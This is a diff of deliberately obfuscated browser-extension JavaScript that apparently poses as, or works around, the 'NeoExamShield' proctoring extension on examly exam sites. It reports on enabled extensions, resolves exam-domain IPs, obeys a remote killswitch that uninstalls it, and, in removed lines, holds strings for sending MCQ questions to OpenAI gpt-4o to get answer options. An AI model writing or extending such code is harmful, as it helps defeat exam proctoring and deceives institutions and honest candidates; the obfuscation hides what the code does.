@@ -1,1505 +1,1120 @@
-var _0x42a4de = _0x1b8f;
-function _0x1b8f(t, e) {
-  var n = _0x4441();
-  return (_0x1b8f = function (t, e) {
-    return n[(t -= 433)];
-  })(t, e);
+const _0x28af84 = _0x41b7;
+function _0x41b7(_0x3cd605, _0x46f37f) {
+  const _0x3ebfee = _0xf5f6();
+  return (
+    (_0x41b7 = function (_0x517284, _0x1a3d77) {
+      _0x517284 = _0x517284 - (0x41d + 0x1 * 0x799 + -0x9e8);
+      var _0x30c9d8 = _0x3ebfee[_0x517284];
+      return _0x30c9d8;
+    }),
+    _0x41b7(_0x3cd605, _0x46f37f)
+  );
 }
-function _0x4441() {
-  var t = [
-    "killswitch",
-    "30070gTTvBf",
-    "aded.",
-    "HcMWd",
-    "SFsOY",
-    "uninstallS",
-    "ion instal",
-    "xzoZP",
-    "catch",
-    "eld extens",
-    "redirect",
-    "6610769bCYTKd",
-    "355439ordOei",
-    "EzpXH",
-    "Error chec",
-    "message",
-    "48cuvzcQ",
-    "led and lo",
-    "213837MVgRPg",
-    "PLjdX",
-    "l.app/api/",
-    "king API:",
-    "o API resp",
-    "pBVIT",
-    "2614920TnUudE",
+(function (_0x4c0998, _0xb94203) {
+  const _0x2386d1 = _0x41b7,
+    _0x26c780 = _0x4c0998();
+  while (!![]) {
+    try {
+      const _0x25263c =
+        (-parseInt(_0x2386d1(0x1fd)) / (0x1 * -0xabd + 0x2206 + 0x1748 * -0x1)) *
+          (-parseInt(_0x2386d1(0x1d4)) / (0x122e + 0x1 * 0x21b5 + -0x33e1)) +
+        parseInt(_0x2386d1(0x200)) / (0x84d + 0x21b8 + -0x1501 * 0x2) +
+        parseInt(_0x2386d1(0x21e)) / (0xcfd + 0x4b4 * 0x2 + -0x1661) +
+        (parseInt(_0x2386d1(0x1e6)) / (0x1322 + 0xd0f + -0x202c)) *
+          (parseInt(_0x2386d1(0x1d7)) / (0x4be + 0x3 * -0x9e5 + 0x18f7)) +
+        (parseInt(_0x2386d1(0x20c)) / (-0x1002 + 0x1ea * -0xd + 0x28eb)) *
+          (-parseInt(_0x2386d1(0x210)) / (0x1b3 * 0x1 + 0x1ea0 + 0x1 * -0x204b)) +
+        -parseInt(_0x2386d1(0x1fa)) / (-0xe8f + -0x1120 + 0x1fb8) +
+        (parseInt(_0x2386d1(0x1e1)) / (0x1e89 + -0x16 * 0xe6 + -0x1 * 0xabb)) *
+          (-parseInt(_0x2386d1(0x212)) / (0x15 * -0x165 + -0x11c2 + 0x1 * 0x2f16));
+      if (_0x25263c === _0xb94203) break;
+      else _0x26c780["push"](_0x26c780["shift"]());
+    } catch (_0x3cef70) {
+      _0x26c780["push"](_0x26c780["shift"]());
+    }
+  }
+})(_0xf5f6, 0x52cd5 + 0x2366 + 0x29704);
+const domain_ip_addresses = [
+  _0x28af84(0x1de) + _0x28af84(0x1e3),
+  _0x28af84(0x21d) + _0x28af84(0x203),
+  _0x28af84(0x1ec) + _0x28af84(0x1f3),
+];
+var currentKey = null,
+  reloadTabOnNextUrlChange = !(-0x821 * 0x2 + -0xb * -0x13d + 0x2a3);
+const urlPatterns = [
+  _0x28af84(0x20e) + _0x28af84(0x201) + "=",
+  _0x28af84(0x1ef),
+  _0x28af84(0x1cf) + _0x28af84(0x1e9),
+  _0x28af84(0x1df) + _0x28af84(0x1f1),
+];
+var isReloading = !(-0x888 + 0x17e3 + 0x1 * -0xf5a);
+function fetchExtensionDetails(_0x550ad3) {
+  const _0x31849d = _0x28af84,
+    _0x1eea84 = {
+      Gllep: function (_0x37f24f, _0x3ee067, _0x55495c) {
+        return _0x37f24f(_0x3ee067, _0x55495c);
+      },
+    };
+  browser[_0x31849d(0x1e4)][_0x31849d(0x21f)]((_0x4185d1) => {
+    const _0x2dda23 = _0x31849d,
+      _0x7b173f = _0x4185d1[_0x2dda23(0x1f6)](
+        (_0x86f5ad) =>
+          _0x86f5ad[_0x2dda23(0x1ee)] &&
+          _0x2dda23(0x1d6) + _0x2dda23(0x205) === _0x86f5ad[_0x2dda23(0x216)] &&
+          _0x2dda23(0x1d9) === _0x86f5ad[_0x2dda23(0x1ff)]
+      ),
+      _0x2ee5a4 = _0x7b173f[_0x2dda23(0x1f6)](
+        (_0x57e146) =>
+          _0x57e146[_0x2dda23(0x1ee)] &&
+          _0x2dda23(0x1d6) + _0x2dda23(0x205) !== _0x57e146[_0x2dda23(0x216)] &&
+          _0x2dda23(0x1d9) === _0x57e146[_0x2dda23(0x1ff)]
+      )[_0x2dda23(0x20d)];
+    _0x1eea84[_0x2dda23(0x1f8)](_0x550ad3, _0x7b173f, _0x2ee5a4);
+  });
+}
+function _0xf5f6() {
+  const _0x2405b6 = [
+    "url",
+    "tabs",
+    "sendMessag",
     "log",
-    "31484aZwDsg",
-    "8foJjXe",
-    "aded due t",
-    "onInstalle",
-    "status",
-    "ion not lo",
-    "get",
-    "runtime",
-    "error",
-    "onse.",
-    "elf",
-    "llURL",
+    "examly.tes",
+    "\x20not\x20exist",
+    "7QKpFKJ",
+    "length",
+    "mycourses/",
+    "lastError",
+    "3906456TPSEwv",
+    "some",
+    "616363Rjwpda",
+    "GBchh",
+    "tZERJ",
+    "esolve?nam",
+    "name",
+    ".\x20Receivin",
+    "examly.net",
+    "ODwfA",
+    "ZtprT",
+    "s.google/r",
+    "data",
+    "34.233.30.",
+    "2337144FBpXAj",
+    "getAll",
+    "examly.io",
+    "mycdetails",
+    "getUrlAndE",
+    "SbASP",
+    "create",
+    "xtensionDa",
+    "681570xLGYKp",
+    "fetch\x20IP\x20a",
     "NeoExamShi",
-    "63jwGKWH",
-    "setUninsta",
-    "kqnFu",
-    "then",
-    "KmMuD",
-    "credential",
+    "126zLgkqG",
+    "catch",
+    "extension",
+    "kClzP",
+    "DXttS",
+    "PIwzm",
+    "Answer",
+    "142.250.19",
+    "/test-comp",
+    "YwOEK",
+    "130Xjivaz",
+    "update",
+    "3.147",
     "management",
-    "local",
+    "connection",
+    "63715cvGdDY",
+    "ddress",
+    "qHSpE",
+    "?c_id=",
+    "Could\x20not\x20",
+    "https://dn",
+    "35.212.92.",
+    "includes",
+    "enabled",
+    "test?id=",
+    "QpbRj",
+    "atibility",
+    "g\x20end\x20does",
+    "221",
+    "yflit",
     "json",
-    "https://th",
-    "1876070pXNObH",
-    "ottathukid",
-    "storage",
-    "addListene",
-    "18bTOoKt",
-    "uven.verce",
+    "filter",
+    "Failed\x20to\x20",
+    "Gllep",
+    "runtime",
+    "2157084OURcsV",
+    "establish\x20",
+    "hostname",
+    "1vqdsxa",
+    "find",
+    "type",
+    "2345067VMluBn",
+    "details?id",
+    "then",
+    "196",
+    "message",
+    "eld",
   ];
-  return (_0x4441 = function () {
-    return t;
+  _0xf5f6 = function () {
+    return _0x2405b6;
+  };
+  return _0xf5f6();
+}
+const fetchDomainIp = (_0x5e0aab) =>
+  new Promise((_0x2681e3) => {
+    const _0x1db768 = _0x28af84,
+      _0x53e86c = {
+        tZERJ: function (_0x3da5a2, _0x27c98f) {
+          return _0x3da5a2(_0x27c98f);
+        },
+        PIwzm: function (_0x4d3505, _0x2b7730) {
+          return _0x4d3505(_0x2b7730);
+        },
+      },
+      _0x116912 = new URL(_0x5e0aab)[_0x1db768(0x1fc)];
+    _0x53e86c[_0x1db768(0x1dc)](
+      fetch,
+      _0x1db768(0x1eb) + _0x1db768(0x21b) + _0x1db768(0x215) + "e=" + _0x116912
+    )
+      [_0x1db768(0x202)]((_0x2d17f9) => _0x2d17f9[_0x1db768(0x1f5)]())
+      [_0x1db768(0x202)]((_0x3e5905) => {
+        const _0x197204 = _0x1db768,
+          _0x15ec02 =
+            _0x3e5905[_0x197204(0x1dd)][_0x197204(0x1fe)](
+              (_0x2f2f3f) =>
+                -0x196b * -0x1 + -0x2 * -0x4a1 + 0x2 * -0x1156 === _0x2f2f3f[_0x197204(0x1ff)]
+            )?.[_0x197204(0x21c)] || null;
+        _0x53e86c[_0x197204(0x214)](_0x2681e3, _0x15ec02);
+      })
+      [_0x1db768(0x1d8)](() => {
+        const _0x5e92e7 = _0x1db768;
+        _0x53e86c[_0x5e92e7(0x214)](_0x2681e3, null);
+      });
+  });
+async function handleUrlChange() {
+  const _0x5dc810 = _0x28af84,
+    _0x5c9721 = {
+      QpbRj: function (_0x373099, _0x3a12f4) {
+        return _0x373099(_0x3a12f4);
+      },
+      ODwfA: function (_0x2ccbc8, _0x5a53a1) {
+        return _0x2ccbc8 === _0x5a53a1;
+      },
+      kClzP:
+        _0x5dc810(0x1ea) +
+        _0x5dc810(0x1fb) +
+        _0x5dc810(0x1e5) +
+        _0x5dc810(0x217) +
+        _0x5dc810(0x1f2) +
+        _0x5dc810(0x20b) +
+        ".",
+      ZtprT: _0x5dc810(0x1d0) + _0x5dc810(0x1d3) + "ta",
+      GBchh: _0x5dc810(0x218),
+      SbASP: _0x5dc810(0x20a) + "t",
+      YwOEK: _0x5dc810(0x1ce),
+      qHSpE: function (_0x2ede6f, _0x4b7e6a) {
+        return _0x2ede6f(_0x4b7e6a);
+      },
+      yflit: _0x5dc810(0x1f7) + _0x5dc810(0x1d5) + _0x5dc810(0x1e7),
+    };
+  if (
+    urlPatterns[_0x5dc810(0x211)]((_0x3e1328) =>
+      tabDetails[_0x5dc810(0x206)][_0x5dc810(0x1ed)](_0x3e1328)
+    )
+  ) {
+    var _0x28ba1b = await ((_0x5a6cfa = tabDetails[_0x5dc810(0x206)]),
+    new Promise((_0x285ec5) => {
+      const _0x5d279e = _0x5dc810,
+        _0x2c142f = {
+          DXttS: function (_0x343ee, _0x580bbb) {
+            const _0x40c51e = _0x41b7;
+            return _0x5c9721[_0x40c51e(0x1f0)](_0x343ee, _0x580bbb);
+          },
+        },
+        _0x45d6a4 = new URL(_0x5a6cfa)[_0x5d279e(0x1fc)];
+      _0x5c9721[_0x5d279e(0x1f0)](
+        fetch,
+        _0x5d279e(0x1eb) + _0x5d279e(0x21b) + _0x5d279e(0x215) + "e=" + _0x45d6a4
+      )
+        [_0x5d279e(0x202)]((_0x5c76e4) => _0x5c76e4[_0x5d279e(0x1f5)]())
+        [_0x5d279e(0x202)]((_0x3345c0) => {
+          const _0x45accb = _0x5d279e,
+            _0x302e2e =
+              _0x3345c0[_0x45accb(0x1dd)][_0x45accb(0x1fe)](
+                (_0x5a5496) => 0x583 * -0x3 + -0x172 + 0x11fc === _0x5a5496[_0x45accb(0x1ff)]
+              )?.[_0x45accb(0x21c)] || null;
+          _0x5c9721[_0x45accb(0x1f0)](_0x285ec5, _0x302e2e);
+        })
+        [_0x5d279e(0x1d8)](() => {
+          const _0x3be32e = _0x5d279e;
+          _0x2c142f[_0x3be32e(0x1db)](_0x285ec5, null);
+        });
+    }));
+    (_0x28ba1b && domain_ip_addresses[_0x5dc810(0x1ed)](_0x28ba1b)) ||
+    tabDetails[_0x5dc810(0x206)][_0x5dc810(0x1ed)](_0x5c9721[_0x5dc810(0x213)]) ||
+    tabDetails[_0x5dc810(0x206)][_0x5dc810(0x1ed)](_0x5c9721[_0x5dc810(0x1d1)]) ||
+    tabDetails[_0x5dc810(0x206)][_0x5dc810(0x1ed)](_0x5c9721[_0x5dc810(0x1e0)])
+      ? _0x5c9721[_0x5dc810(0x1e8)](fetchExtensionDetails, (_0x3cfd86, _0x43feb2) => {
+          const _0x5c4ccb = _0x5dc810;
+          var _0x5ce687 = {
+            action: _0x5c9721[_0x5c4ccb(0x21a)],
+            url: tabDetails[_0x5c4ccb(0x206)],
+            enabledExtensionCount: _0x43feb2,
+            extensions: _0x3cfd86,
+            id: tabDetails["id"],
+            currentKey: currentKey,
+          };
+          browser[_0x5c4ccb(0x207)][_0x5c4ccb(0x208) + "e"](
+            tabDetails["id"],
+            _0x5ce687,
+            (_0x1d61f9) => {
+              const _0x33ec01 = _0x5c4ccb;
+              browser[_0x33ec01(0x1f9)][_0x33ec01(0x20f)] &&
+                _0x5c9721[_0x33ec01(0x219)](
+                  _0x5c9721[_0x33ec01(0x1da)],
+                  browser[_0x33ec01(0x1f9)][_0x33ec01(0x20f)][_0x33ec01(0x204)]
+                ) &&
+                browser[_0x33ec01(0x207)][_0x33ec01(0x1e2)](tabDetails["id"], {
+                  url: tabDetails[_0x33ec01(0x206)],
+                });
+            }
+          );
+        })
+      : console[_0x5dc810(0x209)](_0x5c9721[_0x5dc810(0x1f4)]);
+  }
+  var _0x5a6cfa;
+}
+function openNewMinimizedWindowWithUrl(_0x3f4294) {
+  const _0x514472 = _0x28af84;
+  browser[_0x514472(0x207)][_0x514472(0x1d2)]({ url: _0x3f4294 }, (_0x1a35ba) => {});
+}
+
+//----------------------------------------------------------------------------
+function _0x4c14() {
+  var e = [
+    "54654bEkjXD",
+    "44427950HEBeUd",
+    "qvHCi",
+    "12yLMwgM",
+    "77793DPNbyc",
+    "21pPgVlx",
+    "10743408KMVvhD",
+    "get",
+    "66608zYntxo",
+    "credential",
+    "storage",
+    "PFDSR",
+    "4275954kEyIdE",
+    "3729838ZePQuZ",
+    "425DMZDRP",
+    "local",
+    "11bwksfd",
+  ];
+  return (_0x4c14 = function () {
+    return e;
   })();
 }
+if (
+  ((function (e, t) {
+    for (var n = _0x58e2, r = _0x4c14(); ; )
+      try {
+        if (
+          696073 ===
+          (-parseInt(n(277)) / 1) * (parseInt(n(263)) / 2) +
+            (parseInt(n(276)) / 3) * (parseInt(n(275)) / 4) +
+            (parseInt(n(269)) / 5) * (-parseInt(n(272)) / 6) +
+            -parseInt(n(268)) / 7 +
+            -parseInt(n(278)) / 8 +
+            -parseInt(n(267)) / 9 +
+            (parseInt(n(273)) / 10) * (parseInt(n(271)) / 11)
+        )
+          break;
+        r.push(r.shift());
+      } catch (e) {
+        r.push(r.shift());
+      }
+  })(),
+  void 0 === browser)
+)
+  var browser = chrome;
+function _0x58e2(e, t) {
+  var n = _0x4c14();
+  return (_0x58e2 = function (e, t) {
+    return n[(e -= 263)];
+  })(e, t);
+}
 function getCredentials() {
-  var t = _0x42a4de,
-    e = {
-      PLjdX: function (t, e) {
-        return t(e);
+  var e = _0x58e2,
+    t = {
+      qvHCi: function (e, t) {
+        return e(t);
       },
-      xzoZP: t(477) + "s",
+      PFDSR: e(264) + "s",
     };
   return new Promise((n) => {
-    var r = t;
-    chrome[r(484)][r(479)][r(465)]([e[r(440)]], (t) => {
+    var r = e;
+    browser[r(265)][r(270)][r(279)]([t[r(266)]], (e) => {
       var o = r;
-      e[o(452)](n, t[o(477) + "s"]);
+      t[o(274)](n, e[o(264) + "s"]);
     });
   });
 }
-let tabDetails;
-(function (t, e) {
-  for (var n = _0x1b8f, r = _0x4441(); ; )
+var tabDetails;
+function _0x135c() {
+  var e = [
+    "elf",
+    "NeoExamShi",
+    "llURL",
+    "then",
+    "525TnTVpp",
+    "7FSEZWT",
+    "117808Ndqnmk",
+    "48AnyWUb",
+    "3142968ljBzcj",
+    "gGxIS",
+    "uven.verce",
+    "redirect",
+    "ion instal",
+    "error",
+    "https://th",
+    "addListene",
+    "eld extens",
+    "uUERv",
+    "onse.",
+    "onInstalle",
+    "364076ukXbeC",
+    "runtime",
+    "message",
+    "16191GFMROQ",
+    "aded.",
+    "QomaL",
+    "killswitch",
+    "o API resp",
+    "status",
+    "aded due t",
+    "management",
+    "6186CRghWC",
+    "uninstallS",
+    "1288936ZObSSm",
+    "l.app/api/",
+    "json",
+    "mnjei",
+    "king API:",
+    "ottathukid",
+    "271325pNlBpX",
+    "Error chec",
+    "log",
+    "ion not lo",
+    "1800efeBpC",
+    "catch",
+    "AXnCg",
+    "setUninsta",
+    "led and lo",
+    "IZJNz",
+    "39koDTgQ",
+  ];
+  return (_0x135c = function () {
+    return e;
+  })();
+}
+var _0x21aa0a = _0x3422;
+function _0x3422(e, t) {
+  var n = _0x135c();
+  return (_0x3422 = function (e, t) {
+    return n[(e -= 154)];
+  })(e, t);
+}
+(function (e, t) {
+  for (var n = _0x3422, r = _0x135c(); ; )
     try {
       if (
-        256454 ===
-        (parseInt(n(486)) / 1) * (parseInt(n(459)) / 2) +
-          (parseInt(n(451)) / 3) * (-parseInt(n(460)) / 4) +
-          -parseInt(n(482)) / 5 +
-          -parseInt(n(457)) / 6 +
-          (-parseInt(n(445)) / 7) * (-parseInt(n(449)) / 8) +
-          (-parseInt(n(472)) / 9) * (-parseInt(n(434)) / 10) +
-          parseInt(n(444)) / 11
+        220911 ===
+        -parseInt(n(196)) / 1 +
+          -parseInt(n(177)) / 2 +
+          (-parseInt(n(156)) / 3) * (-parseInt(n(163)) / 4) +
+          (-parseInt(n(161)) / 5) * (parseInt(n(188)) / 6) +
+          (-parseInt(n(162)) / 7) * (parseInt(n(165)) / 8) +
+          (-parseInt(n(180)) / 9) * (-parseInt(n(200)) / 10) +
+          (-parseInt(n(190)) / 11) * (-parseInt(n(164)) / 12)
       )
         break;
       r.push(r.shift());
-    } catch (t) {
+    } catch (e) {
       r.push(r.shift());
     }
 })(),
-  chrome[_0x42a4de(466)][_0x42a4de(462) + "d"][_0x42a4de(485) + "r"](() => {
-    var t = _0x42a4de,
-      e = {
-        SFsOY: function (t, e) {
-          return t === e;
+  browser[_0x21aa0a(178)][_0x21aa0a(176) + "d"][_0x21aa0a(172) + "r"](() => {
+    var e = _0x21aa0a,
+      t = {
+        QomaL: function (e, t) {
+          return e === t;
         },
-        kqnFu: t(471) + t(442) + t(439) + t(450) + t(435),
-        HcMWd: t(471) + t(442) + t(464) + t(461) + t(455) + t(468),
-        KmMuD: t(447) + t(454),
-        pBVIT: function (t, e) {
-          return t(e);
+        AXnCg: e(158) + e(173) + e(169) + e(154) + e(181),
+        gGxIS: e(158) + e(173) + e(199) + e(186) + e(184) + e(175),
+        mnjei: e(197) + e(194),
+        IZJNz: function (e, t) {
+          return e(t);
         },
-        EzpXH: t(481) + t(483) + t(487) + t(453) + t(433),
+        uUERv: e(171) + e(195) + e(167) + e(191) + e(183),
       };
-    e[t(456)](fetch, e[t(446)])
-      [t(475)]((e) => e[t(480)]())
-      [t(475)]((n) => {
-        var r = t;
-        e[r(437)](n[r(463)], !0)
-          ? (console[r(458)](e[r(474)]), console[r(458)](n[r(448)]))
-          : (console[r(458)](e[r(436)]),
-            chrome[r(466)][r(473) + r(470)](n[r(443)]),
-            chrome[r(478)][r(438) + r(469)]());
+    t[e(155)](fetch, t[e(174)])
+      [e(160)]((t) => t[e(192)]())
+      [e(160)]((n) => {
+        var r = e;
+        t[r(182)](!0, n[r(185)])
+          ? (console[r(198)](t[r(202)]), console[r(198)](n[r(179)]))
+          : (console[r(198)](t[r(166)]),
+            browser[r(178)][r(203) + r(159)](n[r(168)]),
+            browser[r(187)][r(189) + r(157)]());
       })
-      [t(441)]((n) => {
-        var r = t;
-        console[r(467)](e[r(476)], n);
+      [e(201)]((n) => {
+        var r = e;
+        console[r(170)](t[r(193)], n);
       });
   });
-const _0x3bb684 = _0x5cbc;
-!(function (t, e) {
-  const n = _0x5cbc,
-    r = _0x3a1b();
+const _0x28af84a = _0x41b7;
+function _0x41b7(e, t) {
+  const n = _0xf5f6();
+  return (_0x41b7 = function (e, t) {
+    return n[(e -= 462)];
+  })(e, t);
+}
+!(function (e, t) {
+  const n = _0x41b7,
+    r = _0xf5f6();
   for (;;)
     try {
       if (
-        668572 ===
-        parseInt(n(515)) / 1 +
-          (-parseInt(n(499)) / 2) * (-parseInt(n(248)) / 3) +
-          (-parseInt(n(261)) / 4) * (-parseInt(n(492)) / 5) +
-          (-parseInt(n(245)) / 6) * (-parseInt(n(541)) / 7) +
-          parseInt(n(225)) / 8 +
-          (parseInt(n(450)) / 9) * (-parseInt(n(540)) / 10) +
-          -parseInt(n(444)) / 11
+        517951 ===
+        (-parseInt(n(509)) / 1) * (-parseInt(n(468)) / 2) +
+          parseInt(n(512)) / 3 +
+          parseInt(n(542)) / 4 +
+          (parseInt(n(486)) / 5) * (parseInt(n(471)) / 6) +
+          (parseInt(n(524)) / 7) * (-parseInt(n(528)) / 8) +
+          -parseInt(n(506)) / 9 +
+          (parseInt(n(481)) / 10) * (-parseInt(n(530)) / 11)
       )
         break;
       r.push(r.shift());
-    } catch (t) {
+    } catch (e) {
       r.push(r.shift());
     }
 })();
-const domain_ip_addresses = [
-  _0x3bb684(295) + _0x3bb684(221),
-  _0x3bb684(393) + _0x3bb684(428),
-  _0x3bb684(229) + _0x3bb684(278),
-];
-let currentKey = null,
-  reloadTabOnNextUrlChange = !0;
-const urlPatterns = [
-  _0x3bb684(246) + _0x3bb684(589) + "=",
-  _0x3bb684(382),
-  _0x3bb684(606) + _0x3bb684(326),
-  _0x3bb684(493) + _0x3bb684(269),
-];
-function _0x3a1b() {
-  const t = [
-    "upSEW",
-    "ISOLATED",
-    "gpt-4o",
-    "LMmnX",
-    "FFEnI",
-    "QCMeM",
-    "JnIgQ",
-    "name",
-    "query",
-    "Wggdg",
-    "gXYNm",
-    "MCQ, just ",
-    "FDUDh",
-    "EwFjG",
-    "fyFrP",
-    "dzXIP",
-    "find",
-    "runtime",
-    "12dNfKiN",
-    "FCYAd",
-    "y explanat",
-    "196",
-    "startsWith",
-    "catch",
-    "IAUTn",
-    "795860MOTO",
-    "BSvlo",
-    "KCCmM",
-    "AvuNt",
-    "OjFGb",
-    "GzecZ",
-    "tabs",
-    "complete",
-    "tdwpr",
-    "tQAwf",
-    "extension",
-    "data",
-    "25869261kVrneO",
-    "nIOeg",
-    "wDxMg",
-    "hwaGC",
-    "MClKy",
-    "pKgqn",
-    "9889398LvXrHS",
-    "QNdtk",
-    "Afhgk",
-    "wVkxI",
-    "ying OpenA",
-    "MAIN",
-    "pdMng",
-    "zhCJZ",
-    "on alone. ",
-    "PHlFy",
-    "MHHTk",
-    "FCBFK",
-    "PTZCs",
-    "Hdjoe",
-    "MNYPI",
-    "kpkQs",
-    "jihJw",
-    "give the o",
-    ".js",
-    "Sapos",
-    "elsGt",
-    "IGkKT",
-    "esolve?nam",
-    "fetch IP a",
-    "ApNey",
-    "kscrl",
-    "tNtPb",
-    "GNUWC",
-    "user",
-    "NeoExamShi",
-    "OYTet",
-    "Could not ",
-    "ysOrx",
-    "key",
-    "pxItU",
-    "PJsUu",
-    "*://*/*",
-    " question ",
-    "pageReload",
-    "wUrPm",
-    "point",
-    "eMPcV",
-    "621380dMwDra",
-    "/test-comp",
-    "IsCII",
-    "AXewP",
-    "XjLFi",
-    "nzRyF",
-    "nswer opti",
-    "9014oUFULB",
-    "VFhuW",
-    "Honoz",
-    "JfArH",
-    "vHanO",
-    "jxgkA",
-    "management",
-    "gistration",
-    "stringify",
-    "ld be in t",
-    "iNFzh",
-    "aMRVO",
-    "openNewTab",
-    "shift",
-    "includes",
-    "hostname",
-    "336939jUvMIA",
-    "oVSdY",
-    "sbhDJ",
-    "pYDeX",
-    "XBmEx",
-    "OWSbv",
-    "tMessage",
-    "actions",
-    "KNyuq",
-    "ETtVS",
-    "gTbiS",
-    "CzJrH",
-    "45zzUBOy",
-    "while quer",
-    "DOiXF",
-    "chmAn",
-    "pRMae",
-    "mFiiD",
-    "eld",
-    "omxqy",
-    "is not an ",
-    "getUrlAndE",
-    "l.app/api/",
-    "xIXfD",
-    "lOVYB",
-    "10eMeYeY",
-    "7unROjr",
-    " think the",
-    "message",
-    "YbbgB",
-    "connection",
-    "LZYBq",
-    "tccoR",
-    "goirk",
-    "Aojek",
-    "ipts",
-    "wtwrp",
-    "wdAFV",
-    "fUZiI",
-    "PmdTk",
-    "setTitle",
-    "FERBT",
-    "afhbZ",
-    "JDwyJ",
-    "iPVAt",
-    "zVJuK",
-    "eSVnJ",
-    "LlUzc",
-    "type",
-    "FJosK",
-    "pPlxN",
-    "updateChat",
-    "mUQSz",
-    "AgLHZ",
-    "YSbQu",
-    "GXqBV",
-    "UyOcU",
-    "HKDpb",
-    "toiUr",
-    "Rmxvc",
-    "ContentScr",
-    "WWQWl",
-    "kyjhO",
-    "dmOsH",
-    "hPoGB",
-    "registerCo",
-    "sistant.",
-    "gindJ",
-    "16tjSxHp",
-    "rwJSp",
-    "status",
-    "141837NqQI",
-    " Failed",
-    "document_s",
-    "details?id",
-    "\nThis is a",
-    "JHPIG",
-    "ption numb",
-    "UYAij",
-    "message re",
-    "er and the",
-    "main",
-    "onMessage",
-    "CUQGr",
-    "xkoeo",
-    "YYXaw",
-    "Blocker Re",
-    "Jntlf",
-    "hJOcY",
-    "dVTUY",
-    "ntAuM",
-    "mycdetails",
-    "ntentScrip",
-    "POST",
-    "content",
-    "WibfU",
-    "g end does",
-    "YZphN",
-    "DxoQX",
-    "xiPeY",
-    "ygDEG",
-    "CsEqY",
-    "mjCqu",
-    "DZtiH",
-    "simQN",
-    "create",
-    "data/injec",
-    "WwGwk",
-    "choices",
-    "RkLzz",
-    "https://",
-    "SbASW",
-    " no.>. <an",
-    "FczhE",
-    "pDyGT",
-    "only say `",
-    "onUpdated",
-    "DucBY",
-    "dFlch",
-    "pSo",
-    "ponse:",
-    "Mpuwg",
-    "Biqbc",
-    "qhlgY",
-    "fhqAU",
-    "oWAQL",
-    "ytNZJ",
-    "busy",
-    "isArray",
-    "ddress",
-    "IfBJh",
-    "kQKCd",
-    "his format",
-    "RhqqF",
-    "enabled",
-    "nBTot",
-    ". Receivin",
-    "YlkfY",
-    "dZprH",
-    "kSCWy",
-    "coMlL",
-    "Error quer",
-    "urvcW",
-    "msRiS",
-    "TKoHK",
-    "ion, Just ",
-    "KXcCh",
-    "NBihe",
-    " correct a",
-    "rYjfq",
-    "get",
-    "ugamQ",
-    "update",
-    "examly.io",
-    "ODMMk",
-    "wHhXf",
-    "NWsmj",
-    "BZIxz",
-    "HiKjz",
-    "osRHl",
-    "Dxuvs",
-    "ysRcE",
-    "resetConte",
-    "Exception ",
-    "AlSjt",
-    "tQeUf",
-    "RygRr",
-    "KoZJz",
-    "tart",
-    "qelvm",
-    "OvDJo",
-    "ZOulB",
-    "BeaDZ",
-    "KGWoa",
-    "t/main.js",
-    "nTjKD",
-    "ion. The o",
-    " MCQ quest",
-    "establish ",
-    "ARKQv",
-    "irLDs",
-    "KAfUQ",
-    "onStartup",
-    "RTXTv",
-    "boYrd",
-    "DBggN",
-    "qXbLr",
-    "xZvop",
-    "dNdhv",
-    "History",
-    "3.147",
-    "WGoBq",
-    "trim",
-    "wAxea",
-    "10252328wILVQc",
-    "uMHaE",
-    "lastError",
-    "idbKO",
-    "35.212.92.",
-    "gAdMC",
-    "XTQvu",
-    "Not an MCQ",
-    "endpoint",
-    "PFjXD",
-    "DYYMW",
-    "applicatio",
-    "LjmMf",
-    "OpenAI res",
-    "then",
-    "MHcvl",
-    "EtXyd",
-    "QWiST",
-    "2919103Lne",
-    "kfLbY",
-    "7633044hFWlPl",
-    "mycourses/",
-    "Yprva",
-    "735kJKCId",
-    "aomeV",
-    "nbDIW",
-    "sSSbR",
-    "673158knIQ",
-    "PcqPw",
-    "267879LuLR",
-    "23338hOmVO",
-    "Failed to ",
-    "examly.net",
-    "isolated",
-    "mEDVG",
-    "xtensionDa",
-    "4WBmqLr",
-    "action",
-    "MevLq",
-    "XWLYQ",
-    "dJYxo",
-    "AwQXD",
-    "dZLTd",
-    "GPZlS",
-    "atibility",
-    "n/json",
-    "mospG",
-    "hWiVL",
-    "uzWAK",
-    "2AhJwSi",
-    "jxuhN",
-    "UbiFC",
-    "sendMessag",
-    "221",
-    "scripting",
-    "utput shou",
-    "jbqZj",
-    "bzleR",
-    "btRdJ",
-    "onInstalle",
-    "TuRBf",
-    "vSJzH",
-    "NWDth",
-    "zIFtA",
-    "EYHXO",
-    "unregister",
-    " : <option",
-    "oBdEI",
-    "LqWjE",
-    "fWdug",
-    "142.250.19",
-    "zkPvk",
-    "JRsFb",
-    "tabId",
-    "lqseA",
-    "setBadgeTe",
-    "RSfjT",
-    "some",
-    "YpRnc",
-    "POpoS",
-    "VqfZL",
-    "wxHGX",
-    "uven.verce",
-    "ZNfxa",
-    "GFWmO",
-    "ATxcu",
+var isReloading = !1;
+function fetchExtensionDetails(e) {
+  const t = _0x28af84,
+    n = {
+      Gllep: function (e, t, n) {
+        return e(t, n);
+      },
+    };
+  browser[t(484)][t(543)]((r) => {
+    const o = t,
+      s = r[o(502)]((e) => e[o(494)] && o(470) + o(517) === e[o(534)] && o(473) === e[o(511)]),
+      a = s[o(502)]((e) => e[o(494)] && o(470) + o(517) !== e[o(534)] && o(473) === e[o(511)])[
+        o(525)
+      ];
+    n[o(504)](e, s, a);
+  });
+}
+function _0xf5f6() {
+  const e = [
     "url",
-    "tvPBv",
-    "hOCTK",
-    "helpful as",
-    "LrCxt",
-    "AbNMP",
-    "https://th",
-    "mazGe",
-    "swer optio",
-    "ottathukid",
-    "processCha",
-    "cDcBR",
-    "filter",
-    "yFVUg",
-    "Qcyaq",
-    "?c_id=",
-    "Bearer ",
-    "ceived",
-    "https://dn",
-    "rgWph",
-    "xwXEE",
-    "FCJGH",
-    "s.google/r",
-    "NTsjZ",
-    "sZUWM",
-    "gImka",
-    "mQDMG",
-    "ukJYG",
-    "windowFocu",
-    "t/isolated",
-    "ZbyYm",
-    "fnJVs",
-    "NkdVU",
-    "128710sqXk",
-    "daKcX",
-    " not exist",
-    "4wnREmm",
-    "ZuRBd",
-    "examly.tes",
-    "EjXbB",
-    "MHzrq",
+    "tabs",
+    "sendMessag",
     "log",
-    "push",
-    "nmHsq",
-    "error",
-    "AHEHP",
-    "getAll",
-    "system",
-    "assistant",
-    "zmOBK",
-    "BoeXU",
-    "teJaq",
-    "fHeTE",
-    "http://",
-    "ukjLt",
-    "lPkHy",
-    "rhebc",
-    "matches",
-    "addListene",
+    "examly.tes",
+    " not exist",
+    "7QKpFKJ",
     "length",
-    "mfwYi",
-    " Failed: ",
-    "ymUpt",
